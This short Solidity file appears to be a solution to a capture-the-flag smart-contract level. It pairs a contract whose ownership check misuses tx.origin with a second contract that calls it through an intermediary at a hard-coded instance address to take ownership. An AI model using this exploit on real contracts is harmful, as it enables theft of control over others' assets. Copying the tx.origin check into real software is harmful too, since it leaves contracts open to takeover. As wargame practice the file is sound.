// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Telephone {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    function changeOwner(address _owner) public {
        if (tx.origin != msg.sender) {
            owner = _owner;
        }
    }
}

contract TelephoneFactory{

    function create() public{
        
        Telephone tel = Telephone(0x215cB8FEd5e9D1A4Ab2763906c045075cc600e3C); //instance address
        tel.changeOwner(msg.sender); // msg.sender = me
    }


}